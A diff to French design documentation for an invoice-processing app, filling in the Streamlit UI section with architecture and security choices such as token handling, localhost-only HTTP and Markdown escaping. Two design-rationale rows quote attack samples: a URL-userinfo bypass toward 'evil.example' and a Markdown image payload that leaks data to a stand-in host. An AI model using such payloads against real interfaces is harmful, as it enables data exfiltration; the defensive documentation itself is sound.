@@ -498,6 +498,7 @@ Excel `.xlsx` reporté. Revue : `docs/security/P3_EXPORT_REVIEW.md`.
 - Le gestionnaire d'erreurs journalise le **type** de l'exception et le code HTTP, jamais son message (chemins, contenu).
 - Un chemin de projet très profond peut dépasser `MAX_PATH` (260) sous Windows : cache et uploads deviennent inécrivables (500 « stockage »). Garder le projet près de la racine.
 - Lancement : `--no-access-log --no-server-header` (voir `make api`).
+- Aucun objet créé à l'import : `app = create_app()` au niveau du module lisait le vrai `.env` (toutes les clés) dans tout processus important le module. L'API se lance avec `uvicorn --factory src.api.app:create_app`.
 
 Revue : `docs/security/P3_API_REVIEW.md`.
 
@@ -552,11 +553,40 @@ Le câblage (jeton + limiteurs + middleware + `delete_upload` en `finally` + `pu
 
 ## 5. Module UI 🖥
 
-**Rôle** : interface Streamlit pour uploader, visualiser, corriger, exporter.
+**Rôle** : interface Streamlit en français (4 écrans, `docs/wireframes.md`), **client HTTP de l'API** (option A validée).
 
-**Fichier** : `src/ui/app.py`
+### 5.1 Architecture
 
-*Section vide — sera remplie à P4.*
+```
+Navigateur ──► Streamlit (src/ui, 127.0.0.1:8501) ──HTTP + jeton──► API (127.0.0.1:8000) ──► services / base / cache / Gemini
+```
+
+| Fichier | Rôle |
+|---------|------|
+| `src/ui/app.py` | Point d'entrée, navigation (`st.navigation`), bandeau « API indisponible » |
+| `src/ui/config.py` | Lit **seulement** `API_URL` et `API_TOKEN` (sans les mettre dans `os.environ`) |
+| `src/ui/api_client.py` | Client `httpx` : jeton, erreurs → messages français, aucune donnée brute d'erreur |
+| `src/ui/models.py` | Modèles de lecture des réponses de l'API (indépendants du backend) |
+| `src/ui/safe.py`, `format.py` | Échappement Markdown de tout texte venant de l'API ; formats (euros, dates, statut) |
+| `src/ui/services.py` | `get_client()` (un client par processus) : point d'injection des tests |
+| `src/ui/pages/*.py` | Un fichier par écran |
+
+### 5.2 Choix
+
+| # | Choix | Pourquoi |
+|---|-------|----------|
+| 1 | L'interface appelle l'API en HTTP (option A) | Moindre privilège dans le code : l'interface n'utilise que le jeton, jamais les clés de chiffrement ni Gemini ; elle passe par la couche de sécurité de l'API |
+| 2 | `config.py` lit `.env.ui` s'il existe, sinon `.env`, mais **uniquement** `API_URL` et `API_TOKEN`, avec `dotenv_values` (rien dans `os.environ`) | Sinon `load_dotenv()` chargerait aussi `CACHE_ENCRYPTION_KEY` et `GOOGLE_API_KEY` dans le processus Streamlit. **Limite honnête** : avec un seul `.env`, le fichier reste lisible par le même utilisateur du système ; l'isolation réelle demande un `.env.ui` séparé (gitignoré) |
+| 3 | `API_URL` : `http` autorisé **seulement** vers `127.0.0.1` / `localhost` ; `https` ailleurs ; sinon refus | Le jeton part en clair : une URL mal saisie vers un hôte distant le publierait. Le nom d'hôte est extrait par un vrai parseur (`http://127.0.0.1@evil.example` est refusé) |
+| 4 | `follow_redirects=False`, `trust_env=False` | Une redirection ne doit pas emporter le jeton vers un autre hôte ; les variables `HTTP_PROXY` de l'environnement ne doivent pas faire transiter le jeton par un proxy |
+| 5 | Les messages d'erreur affichés viennent du champ `detail` de l'API (messages fixes), tronqués ; 401 → message de configuration ; réponse non JSON → message générique | Jamais de corps brut, de trace ni de jeton dans l'interface |
+| 6 | Identifiants validés (UUID) avant d'être mis dans une URL | Défense en profondeur contre `../` |
+| 7 | Nom du fichier CSV pris dans `Content-Disposition` seulement s'il respecte `[A-Za-z0-9_.-]+.csv` | Le serveur le construit avec des dates, mais on ne fait pas confiance à un en-tête |
+| 8 | Streamlit : `address=127.0.0.1`, `maxUploadSize=10`, `gatherUsageStats=false`, `showErrorDetails="none"`, XSRF et CORS activés | Pas d'écoute réseau, limite alignée sur l'API, pas de télémétrie, pas de trace d'erreur dans le navigateur |
+| 9 | Règle : jamais `unsafe_allow_html`. Texte venant de l'API → `st.text` / `st.dataframe`, sinon `safe()` | `![x](http://evil/?d=1)` dans un nom de fournisseur deviendrait une image qui envoie des données à l'extérieur |
+| 10 | Pas d'aperçu du PDF ni de « Re-extraire » (le PDF n'est pas conservé) : la colonne de gauche de l'écran Résultat affiche fichier, dates, suppression automatique, fiabilité, avertissements | Décision de minimisation des données (P3) |
+
+**Tests** : `AppTest` (Streamlit) par page avec un faux client injecté via `services.get_client` ; `ApiClient` testé contre la **vraie** application FastAPI en mémoire, et contre des transports simulés pour les erreurs.
 
 ---
 
